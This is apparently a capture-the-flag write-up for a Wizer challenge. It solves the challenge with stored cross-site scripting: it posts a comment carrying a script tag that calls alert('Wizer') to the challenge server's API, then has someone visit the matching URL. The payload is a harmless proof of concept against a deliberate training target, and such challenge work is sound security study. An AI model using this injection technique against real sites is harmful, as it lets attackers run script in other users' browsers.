# Challenge

Inject an alert("Wizer")

# Solution

This one was rather simple. It is a stored XSS.

You first need to get a UUID (https://www.uuidgenerator.net/version4) then make a comment with your payload using that UUID.

Send a `POST` request to `https://chal45-h8f5i.vercel.app/comment?sid=<YOUR_UUID_HERE>` with the following payload:

```
{
  "sid": "<YOUR_UUID_HERE>",
  "content": "<script>alert(\"Wizer\")</script>"
}
```

Then just get someone to visit the URL in a browser: `https://chal45-h8f5i.vercel.app/?sid=<YOUR_UUID_HERE>` (which is also the payload needed to pass the challenge)..